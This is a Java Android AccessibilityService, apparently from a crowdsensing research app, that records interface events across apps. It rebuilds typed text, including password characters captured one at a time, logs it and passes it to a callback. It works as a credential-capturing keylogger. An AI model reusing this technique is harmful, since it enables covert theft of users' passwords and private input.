package com.apisense.bee.services;

import android.accessibilityservice.AccessibilityService;
import android.os.SystemClock;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.apisense.bee.utils.accessibilitySting.AccessibilityEventWrapper;

import java.util.Stack;

/**
 * Created by mnaseri on 11/16/17.
 */

public class EventObserver extends AccessibilityService {
    private static final String TAG = EventObserver.class.getName();

    private static OnAccessibilityEvent callback;
    static Stack<StackElement> events = new Stack<>();
    static StackElement lastEvent = null;
    static String tempInput = "";
    static AccessibilityEventWrapper tempWrapper;

    static String editTextClass = "android.widget.EditText";

    static String widgetClass = "android.widget";

    @Override
    public void onServiceConnected() {
        Log.d(TAG, "onServiceConnected");

        long t_start = SystemClock.uptimeMillis();
        Log.d(TAG, "EXECUTION START-TIME: " + t_start);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {

        if (event != null) {
            if (events.size() > 0)
                lastEvent = events.lastElement();

            if (lastEvent != null) {

                if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED &&
                        (lastEvent.eventType.equals(AccessibilityEvent.eventTypeToString(AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED))
                                || (lastEvent.eventType.equals(AccessibilityEvent.eventTypeToString(AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED))
                        ))) {
                    if (event.getText().size() != 0) {
                        if (event.isPassword()) {
                            tempInput += getLastCharacter(String.valueOf(event.getText().get(0)));
                            tempWrapper = new AccessibilityEventWrapper(event, tempInput);
                        } else {
                            tempInput = String.valueOf(event.getText().get(0));
                            tempWrapper = new AccessibilityEventWrapper(event, tempInput);
                        }
                    }
                }

                if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_FOCUSED &&
                        (lastEvent.eventType.equals(AccessibilityEvent.eventTypeToString(AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED))
                                || (lastEvent.eventType.equals(AccessibilityEvent.eventTypeToString(AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED))))) {

                    if (!tempInput.equals("")) {
                        Log.d(TAG, "onAccessibilityEvent: " + tempWrapper.toString());
                        if (callback != null) {
                            callback.sendData(tempWrapper);
                        }
                    }

                    if (!event.isPassword()) {
                        if (event.getClassName().equals(editTextClass))
                            if (event.getText().size() != 0)
                                tempInput = String.valueOf(event.getText().get(0));
                            else
                                tempInput = "";
                    } else {
                        tempInput = "";
                    }

                }

                if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                    if (!tempInput.equals("")) {
                        Log.d(TAG, "onAccessibilityEvent: " + tempWrapper.toString());
                        if (callback != null) {
                            callback.sendData(tempWrapper);
                        }
                        AccessibilityEventWrapper accessibilityEventWrapper = new AccessibilityEventWrapper(event, null);
                        Log.d(TAG, "onAccessibilityEvent: " + accessibilityEventWrapper.toString());
                        if (callback != null) {
                            callback.sendData(accessibilityEventWrapper);
                        }
                        tempInput = "";
                    }
                }

                if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_HOVER_ENTER && event.getText() != null) {
                    if (event.getText().get(0).equals("delete")) {
                        tempInput = removeLastChar(tempInput);
                        tempWrapper = new AccessibilityEventWrapper(event, tempInput);
                    } else {
                        tempInput += String.valueOf(event.getText().get(0));
                        tempWrapper = new AccessibilityEventWrapper(event, tempInput);
                    }
                }

                if (event.getText().size() != 0 && event.getClassName() != null && tempInput == ""
                        && !event.getClassName().toString().equals(editTextClass)
                        && event.getClassName().toString().toLowerCase().contains(widgetClass.toLowerCase())) {
                    AccessibilityEventWrapper accessibilityEventWrapper = new AccessibilityEventWrapper(event, null);
                    Log.d(TAG, "onAccessibilityEvent: " + accessibilityEventWrapper.toString());
                    if (callback != null) {
                        callback.sendData(accessibilityEventWrapper);
                    }
                    tempInput = "";
                }

            }


            if (event.getEventType() != 0) {
                String packageName = "";
                if (event.getPackageName() != null) {
                    packageName = event.getPackageName().toString();
                }
                events.push(new StackElement(AccessibilityEvent.eventTypeToString(event.getEventType()), packageName));
            }
        }
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "onInterrupt");
        super.onDestroy();
    }

    @Override
    public void onDestroy() {
        Log.d(TAG, "onDestroy");
        super.onDestroy();
    }

    public static void createCallback(OnAccessibilityEvent inputCallback) {
        callback = inputCallback;
    }

    public interface OnAccessibilityEvent {
        void sendData(AccessibilityEventWrapper event);
    }

    public String getLastCharacter(String input) {
        return input.substring(input.length() - 1);
    }

    private String removeLastChar(String str) {
        if (str.length() > 0)
            return str.substring(0, str.length() - 1);
        return str;
    }


    class StackElement {
        public StackElement(String eventType, String eventPackage) {
            this.eventType = eventType;
            this.eventPackage = eventPackage;
        }

        public String eventType;
        public String eventPackage;
    }
}
